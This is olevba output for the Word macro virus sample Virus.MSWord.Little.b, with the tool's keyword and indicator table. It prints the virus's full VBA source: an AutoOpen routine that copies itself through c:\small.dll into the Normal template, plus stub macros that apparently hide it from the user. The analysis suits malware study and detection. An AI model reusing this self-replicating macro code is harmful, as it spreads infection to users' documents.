olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Little.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Little.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO s.bas 
in file: Virus.MSWord.Little.b - OLE stream: 'Macros/VBA/s'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\small", "small") = False) Then
ActiveDocument.VBProject.VBComponents("s").Export "c:\small.dll"
NormalTemplate.VBProject.VBComponents.Import ("c:\small.dll")
System.PrivateProfileString("", "HKEY_CURRENT_USER\small", "small") = True
ElseIf ActiveDocument.VBProject.VBComponents.Item("s").Name <> "s" Then
ActiveDocument.VBProject.VBComponents.Import ("c:\small.dll")
End If
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |small.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

